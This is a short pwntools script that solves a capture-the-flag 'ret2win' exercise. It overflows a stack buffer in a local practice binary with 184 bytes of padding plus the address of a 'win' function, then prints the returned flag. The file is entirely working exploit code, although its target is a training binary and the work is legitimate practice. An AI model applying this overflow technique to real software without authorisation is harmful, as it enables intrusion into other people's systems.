from pwn import *

# make pwntools shut up!!!
logging.getLogger('pwnlib').setLevel(logging.WARNING)

binary = '../bins3/bin-ret2win-0'
elf = ELF(binary)
rop = ROP(elf)

buf = b'A'*184

win = p64(elf.sym['win'])

io = process(binary)
io.sendline(buf + win)

io.recvuntil(b'flag')
print("flag" + io.recvuntil(b'}').decode('utf-8'))
